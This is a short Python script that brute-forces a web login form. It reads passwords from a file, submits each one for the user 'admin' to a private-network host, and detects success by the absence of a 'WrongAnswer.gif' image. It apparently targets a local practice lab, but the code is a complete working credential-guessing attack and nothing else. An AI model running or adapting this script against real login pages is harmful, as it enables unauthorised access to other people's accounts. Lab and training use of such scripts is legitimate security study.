import requests
from bs4 import BeautifulSoup

f = open("pass.txt", "r")

for x in f:
    params = {
        'page': 'signin',
        'username': 'admin',
        'password': x.strip(),
        'Login': 'Login',
    }
    # print(params)

    response = requests.get('http://192.168.56.3/', params=params)
    html_content= response.content
    soup = BeautifulSoup(html_content, 'html.parser')
    if soup.find('img', {'src': 'images/WrongAnswer.gif'}):
        continue
        # print(f"Found WrongAnswer.gif with password: {x.strip()}")
    else:
        print(f"password: {x.strip()}")

